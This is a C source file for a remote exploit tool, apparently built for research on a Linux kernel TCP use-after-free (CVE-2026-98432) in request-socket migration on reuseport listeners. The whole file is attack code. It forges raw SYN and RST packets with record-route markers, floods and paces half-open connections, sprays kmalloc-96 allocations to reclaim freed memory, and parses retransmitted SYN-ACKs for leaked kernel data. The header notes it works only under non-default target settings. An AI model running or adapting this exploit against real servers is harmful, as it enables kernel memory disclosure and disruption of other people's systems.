/* exp_migrate.c - CVE-2026-98432 remote trigger via reqsk migration (mode 2:
 * ANY plain TCP port; NO MPTCP, NO tokens, NO crypto).
 *
 * Trigger (advisory trigger #2): when a reuseport listener is closed with
 * pending half-open requests (or reuseport_migrate_sock fires), the req
 * timer's migration path (inet_connection_sock.c:1021+) does:
 *   nreq = inet_reqsk_clone(req, nsk);   // memcpy -> CLONE SHARES ireq_opt
 *   ... original req is dropped -> tcp_v4_reqsk_destructor -> kfree(ireq_opt)
 * The CLONE's ireq_opt is now DANGLING for up to the next SYN-ACK retransmit
 * (~1s). Any dup SYN to the clone retransmits via inet_rtx_syn_ack ->
 * tcp_v4_send_synack reads the freed (and by then reclaimed) options.
 * NO TIMING RACE: the window is ~1 second wide.
 *
 * Preconditions on the target (not default; the "specific conditions" from
 * the advisory):
 *   sysctl -w net.ipv4.tcp_migrate_req=1
 *   a SO_REUSEPORT listener group (>=2 sockets) on the port, periodically
 *   restarted (each restart migrates the pending reqs -> dangling clones).
 *
 * Tool pipeline:
 *   creator: SYN with RR marker, paced to keep ~MAXOUT half-open reqs alive
 *            (under the listener's young-queue cap).
 *   capture: learn snt_isn per flow (generation-checked via ack==isn+1);
 *            detect foreign RR markers in retransmitted SYN-ACKs.
 *   reader:  dup SYN per flow every ~500ms (target rate limit) - the reader.
 *   churn:   SYN(RR churn marker)+RST - kmalloc-96 save_options alloc/free
 *            reclaim of the dangling slots (same callsite, same cache).
 *
 * Usage: ./exp_migrate <target_ip> <port> [runtime_s]  (needs CAP_NET_RAW)
 *
 * STATUS (2026-11-09): migrations were observed, but the free and the reader
 * still share the tuple's CPU, so this path is serialized on default targets.
 * The preconditions are non-default (tcp_migrate_req=1 + reuseport + restart).
 * See AGENTS.md "remote serialization wall" and docs/STATUS.md.
 */
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <net/if.h>
#include <netinet/in.h>
#include <pthread.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

#define IPHDR 20
#define OPTLEN 40
#define TCPHDR 20
#define NSLOTS 2048
#define SPORT_POOL 8192
#define VBASE 40000
#define CBASE 50000
#define CNUM 15000
#define MAXOUT 2000              /* target outstanding half-open reqs */

#define VMARK(x)  (0x5AA50000u | ((x) & 0x7FFF))
#define CMARK(x)  (0x5AA5C000u | ((x) & 0x3FFF))

static char g_target[64], g_self[64];
static struct sockaddr_in g_dst;
static int g_dport = 9800, g_runtime = 300;
static volatile int g_run = 1;
static int g_fd = -1;
static uint32_t g_seed;

enum { ST_FREE=0, ST_SYNSENT, ST_EST };
struct slot {
    _Atomic int state;
    uint32_t client_isn, snt_isn, marker;
    uint16_t sport;
    struct timespec t0, t_dup;
};
static struct slot g_slots[NSLOTS];

static atomic_ulong g_syn, g_dup, g_synack, g_stale, g_xflow, g_churnhit,
                      g_foreign, g_churn, g_outstanding, g_rst;

static void die(const char *m) { perror(m); exit(1); }
static uint16_t csum(const void *b, int len) {
    const uint8_t *p = b; uint32_t s = 0;
    while (len > 1) { s += (p[0] << 8) | p[1]; p += 2; len -= 2; }
    if (len) s += p[0] << 8;
    while (s >> 16) s = (s & 0xffff) + (s >> 16);
    return (uint16_t)~s;
}
static void ip_hdr_fill(uint8_t *ip, int total) {
    memset(ip, 0, IPHDR);
    ip[0] = 0x45; ip[2] = total >> 8; ip[3] = total & 0xff;
    ip[6] = 0x40; ip[8] = 64; ip[9] = 6;
    inet_pton(AF_INET, g_self, ip + 12);
    inet_pton(AF_INET, g_target, ip + 16);
    uint16_t c = csum(ip, IPHDR); ip[10] = c >> 8; ip[11] = c & 0xff;
}
static int build_tcp(uint8_t *pkt, uint16_t sport, uint32_t seq, uint32_t ack,
                     uint8_t flags, uint32_t marker) {
    int ihl = marker ? IPHDR + OPTLEN : IPHDR;
    int total = ihl + TCPHDR;
    memset(pkt, 0, total);
    uint8_t *ip = pkt, *tcp = pkt + ihl;
    ip_hdr_fill(ip, total);
    if (marker) {
        ip[0] = 0x40 | (ihl / 4);
        uint8_t *o = pkt + IPHDR;
        o[0] = 7; o[1] = 39; o[2] = 4;
        memcpy(o + 3 + 4, &marker, 4);
        memcpy(o + 3 + 8, &marker, 4);
        memcpy(o + 3 + 12, &marker, 4);
        uint16_t c = csum(ip, ihl); ip[10] = c >> 8; ip[11] = c & 0xff;
    }
    tcp[0] = sport >> 8; tcp[1] = sport;
    tcp[2] = g_dport >> 8; tcp[3] = g_dport;
    tcp[4] = seq >> 24; tcp[5] = seq >> 16; tcp[6] = seq >> 8; tcp[7] = seq;
    tcp[8] = ack >> 24; tcp[9] = ack >> 16; tcp[10] = ack >> 8; tcp[11] = ack;
    tcp[12] = 5 << 4; tcp[13] = flags; tcp[14] = 0xff; tcp[15] = 0xff;
    uint8_t b[12 + TCPHDR];
    memcpy(b, ip + 12, 8); b[8] = 0; b[9] = 6; b[10] = 0; b[11] = TCPHDR;
    tcp[16] = tcp[17] = 0;
    memcpy(b + 12, tcp, TCPHDR);
    uint16_t c = csum(b, 12 + TCPHDR);
    tcp[16] = c >> 8; tcp[17] = c & 0xff;
    return total;
}
static void xsend(const uint8_t *pkt, int len) {
    sendto(g_fd, pkt, len, 0, (struct sockaddr *)&g_dst, sizeof(g_dst));
}
static long age_ms(const struct timespec *t0) {
    struct timespec n; clock_gettime(CLOCK_MONOTONIC, &n);
    return (n.tv_sec - t0->tv_sec) * 1000L + (n.tv_nsec - t0->tv_nsec) / 1000000;
}

/* ---------------- capture ------------------------------------------------ */
static void parse_rr(const uint8_t *ip, int ihl, struct slot *S, int slot) {
    int olen = ihl - IPHDR;
    if (olen < 8) return;
    uint8_t *o = (uint8_t *)ip + IPHDR;
    for (int i = 0; i + 3 < olen;) {
        if (o[i] == 0) break;
        if (o[i] == 1) { i++; continue; }
        int l = o[i + 1];
        if (l < 2 || i + l > olen) break;
        if (o[i] == 7 && l >= 8) {
            for (int k = 3; k + 4 <= l; k += 4) {
                uint32_t v; memcpy(&v, o + i + k, 4);
                if (v == S->marker) continue;
                if ((v & 0xFFFF8000u) == 0x5AA50000u) {
                    atomic_fetch_add(&g_xflow, 1);
                    if (g_xflow <= 30)
                        printf("[+] CROSS-FLOW UAF: slot=%d marker=0x%08x (expected 0x%08x)\n",
                               slot, v, S->marker);
                } else if ((v & 0xFFFFC000u) == 0x5AA5C000u) {
                    atomic_fetch_add(&g_churnhit, 1);
                    if (g_churnhit <= 30)
                        printf("[+] CHURN-RECLAIM UAF: slot=%d marker=0x%08x (expected 0x%08x)\n",
                               slot, v, S->marker);
                } else if ((v & 0x000000FFu) == 0x0000007Fu ||
                           (v & 0x0000FFFFu) == 0x0000A8C0u || v == 0) {
                    /* recorded IPs / zero - normal */
                } else if ((v & 0xFFFF0000u) == 0xFFFF0000u) {
                    atomic_fetch_add(&g_foreign, 1);
                    printf("[PTR?] slot=%d word=0x%08x\n", slot, v);
                } else {
                    atomic_fetch_add(&g_foreign, 1);
                    if (g_foreign <= 20)
                        printf("[FOREIGN] slot=%d word=0x%08x (expected 0x%08x)\n",
                               slot, v, S->marker);
                }
            }
        }
        i += l;
    }
}

static void *capture(void *arg) {
    (void)arg;
    int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
    if (s < 0) die("capture socket");
    int rcv = 8 << 20;
    setsockopt(s, SOL_SOCKET, SO_RCVBUF, &rcv, sizeof(rcv));
    struct timeval tv = { .tv_sec = 0, .tv_usec = 200000 };
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    uint8_t buf[2048];
    while (g_run) {
        ssize_t n = recv(s, buf, sizeof(buf), 0);
        if (n < 14 + IPHDR + TCPHDR) continue;
        uint8_t *ip = buf + 14;
        if ((ip[0] >> 4) != 4) continue;
        int ihl = (ip[0] & 0xf) * 4;
        if (ihl < IPHDR || n < 14 + ihl + TCPHDR) continue;
        uint8_t *tcp = ip + ihl;
        uint16_t sport = (tcp[0] << 8) | tcp[1];
        uint16_t dport = (tcp[2] << 8) | tcp[3];
        if (sport != g_dport || dport < VBASE || dport >= VBASE + SPORT_POOL)
            continue;
        uint8_t flags = tcp[13];
        if ((flags & 0x12) != 0x12) continue;      /* SYN+ACK (incl. rtx) */
        uint32_t seq = ((uint32_t)tcp[4]<<24)|(tcp[5]<<16)|(tcp[6]<<8)|tcp[7];
        uint32_t ack = ((uint32_t)tcp[8]<<24)|(tcp[9]<<16)|(tcp[10]<<8)|tcp[11];
        int sl = (dport - VBASE) % NSLOTS;
        struct slot *S = &g_slots[sl];
        atomic_fetch_add(&g_synack, 1);
        if (S->state == ST_SYNSENT && ack == S->client_isn + 1) {
            S->snt_isn = seq;
            S->state = ST_EST;
            atomic_fetch_add(&g_outstanding, 1);
            clock_gettime(CLOCK_MONOTONIC, &S->t_dup);
            continue;                              /* initial SYN-ACK: own opts */
        }
        if (S->state == ST_EST && ack == S->client_isn + 1) {
            /* retransmitted SYN-ACK: this is the reader's output - if the
             * req was migrated+dangling, the options may be reclaimed */
            parse_rr(ip, ihl, S, sl);
        }
    }
    return NULL;
}

/* ---------------- creator: paced half-open reqs -------------------------- */
static void *creator(void *arg) {
    (void)arg;
    uint8_t pkt[128];
    uint32_t cnt = 0;
    struct timespec last = {0,0};
    while (g_run) {
        /* pace so outstanding stays under MAXOUT (reqs live ~63s) */
        long us;
        do {
            struct timespec now; clock_gettime(CLOCK_MONOTONIC, &now);
            us = (now.tv_sec-last.tv_sec)*1000000L + (now.tv_nsec-last.tv_nsec)/1000;
            if (us < 500) usleep(100);
        } while (us < 500 && g_run);
        clock_gettime(CLOCK_MONOTONIC, &last);
        uint16_t sport = VBASE + (cnt % SPORT_POOL);
        int s = (sport - VBASE) % NSLOTS;
        struct slot *S = &g_slots[s];
        int expect = ST_FREE;
        if (!atomic_compare_exchange_strong(&S->state, &expect, ST_SYNSENT)) {
            cnt++;
            continue;
        }
        S->sport = sport;
        S->marker = VMARK(cnt);
        S->client_isn = 0x6d500000u + g_seed + cnt * 7919u;
        S->snt_isn = 0;
        clock_gettime(CLOCK_MONOTONIC, &S->t0);
        int n = build_tcp(pkt, sport, S->client_isn, 0, 0x02, S->marker);
        xsend(pkt, n);
        atomic_fetch_add(&g_syn, 1);
        cnt++;
    }
    return NULL;
}

/* Phased attack: the migration (clone, T0) must overlap a free of the
 * ORIGINAL req (our RST through the embryonic-reset drop path) before
 * reqsk_migrate_reset NULLs the original's ireq_opt (T1) - then the CLONE
 * dangles and any later dup-SYN retransmit reads reclaimed content (~1s).
 * Phase A (dup): keep reqs alive + read. Phase B (rst): stop duping so the
 * req timers fire (migration!) while RSTs kill originals mid-clone.
 * Global phase flag. */
static volatile int g_phase;   /* 0 = dup/read, 1 = silence, 2 = rst-on-migration-wave */

static void *phaser(void *arg) {
    (void)arg;
    while (g_run) {
        g_phase = 0; usleep(3000000);    /* 3s dup/read (keeps reqs + reads) */
        g_phase = 1; usleep(600000);     /* 0.6s silence: timers arm */
        g_phase = 2; usleep(1400000);    /* 1.4s RST flood ON the migration wave */
    }
    return NULL;
}

static void *reader(void *arg) {
    (void)arg;
    uint8_t pkt[128];
    while (g_run) {
        int did = 0;
        for (int s = 0; s < NSLOTS && g_run; s++) {
            struct slot *S = &g_slots[s];
            if (S->state != ST_EST) continue;
            if (g_phase == 0) {
                if (age_ms(&S->t_dup) < 480) continue;
                clock_gettime(CLOCK_MONOTONIC, &S->t_dup);
                int n = build_tcp(pkt, S->sport, S->client_isn, 0, 0x02, S->marker);
                xsend(pkt, n);
                atomic_fetch_add(&g_dup, 1);
            } else if (g_phase == 2) {
                /* RST burst: embryonic-reset the ORIGINAL while the migration
                 * timer is mid-clone (T0..T1) -> clone dangles */
                int n = build_tcp(pkt, S->sport, S->client_isn + 1, 0, 0x04, 0);
                xsend(pkt, n);
                xsend(pkt, n);
                atomic_fetch_add(&g_rst, 1);
            }
            did++;
        }
        if (!did) usleep(200);
    }
    return NULL;
}

/* ---------------- reaper: recycle dead slots ----------------------------- */
static void *reaper(void *arg) {
    (void)arg;
    uint8_t pkt[64];
    while (g_run) {
        for (int s = 0; s < NSLOTS && g_run; s++) {
            struct slot *S = &g_slots[s];
            if (S->state == ST_FREE) continue;
            if (age_ms(&S->t0) < 60000) continue;    /* req lifetime ~63s */
            S->state = ST_FREE;
            atomic_fetch_sub(&g_outstanding, 1);
        }
        usleep(1000000);
    }
    return NULL;
}

/* ---------------- churn: kmalloc-96 save_options alloc/free -------------- */
static void *churn(void *arg) {
    (void)arg;
    uint8_t syn[128], rst[64];
    for (uint32_t i = 0; g_run; i++) {
        uint16_t sport = CBASE + (i % CNUM);
        uint32_t isn = 0x12340000u + i;
        int ns = build_tcp(syn, sport, isn, 0, 0x02, CMARK(i));
        xsend(syn, ns);
        int nr = build_tcp(rst, sport, isn + 1, 0, 0x04, 0);
        xsend(rst, nr);
        atomic_fetch_add(&g_churn, 1);
        if (i % 64 == 63) usleep(4000);
    }
    return NULL;
}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);
    if (argc < 3) {
        fprintf(stderr, "usage: %s <target_ip> <port> [runtime_s]\n", argv[0]);
        return 1;
    }
    snprintf(g_target, sizeof(g_target), "%s", argv[1]);
    g_dport = atoi(argv[2]);
    if (argc > 3) g_runtime = atoi(argv[3]);
    memset(&g_dst, 0, sizeof(g_dst));
    g_dst.sin_family = AF_INET;
    g_dst.sin_port = htons(g_dport);
    if (inet_pton(AF_INET, g_target, &g_dst.sin_addr) != 1) die("bad target ip");
    g_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (g_fd < 0) {
        fprintf(stderr, "[-] raw socket failed (errno=%d); grant: sudo setcap cap_net_raw+ep %s\n",
                errno, argv[0]);
        return 1;
    }
    int u = socket(AF_INET, SOCK_DGRAM, 0);
    if (u >= 0) {
        if (connect(u, (struct sockaddr *)&g_dst, sizeof(g_dst)) == 0) {
            struct sockaddr_in lo; socklen_t sl = sizeof(lo);
            if (getsockname(u, (struct sockaddr *)&lo, &sl) == 0)
                inet_ntop(AF_INET, &lo.sin_addr, g_self, sizeof(g_self));
        }
        close(u);
    }
    if (!g_self[0]) die("cannot determine source ip");
    g_seed = (uint32_t)(getpid() ^ (time(NULL) & 0xffff)) * 2654435761u;
    printf("[*] exp_migrate: target=%s:%d src=%s runtime=%ds\n",
           g_target, g_dport, g_self, g_runtime);
    printf("[*] needs on target: tcp_migrate_req=1 + reuseport listener + periodic restart\n");

    pthread_t th[5];
    pthread_create(&th[0], NULL, capture, NULL);
    pthread_create(&th[1], NULL, creator, NULL);
    pthread_create(&th[2], NULL, reader, NULL);
    pthread_create(&th[3], NULL, churn, NULL);
    pthread_create(&th[4], NULL, phaser, NULL);

    time_t t0 = time(NULL);
    while (time(NULL) - t0 < g_runtime) {
        sleep(10);
        printf("[t+%3lds] syn=%lu synack=%lu dup=%lu rst=%lu out=%lu xflow=%lu churnhit=%lu foreign=%lu churn=%lu\n",
               (long)(time(NULL)-t0), g_syn, g_synack, g_dup, g_rst, g_outstanding,
               g_xflow, g_churnhit, g_foreign, g_churn);
        if (g_xflow || g_churnhit) printf("[+] USE-AFTER-FREE observed on the wire\n");
    }
    g_run = 0;
    for (int i = 0; i < 5; i++) pthread_join(th[i], NULL);
    printf("[*] done\n");
    return (g_xflow || g_churnhit) ? 0 : 2;
}
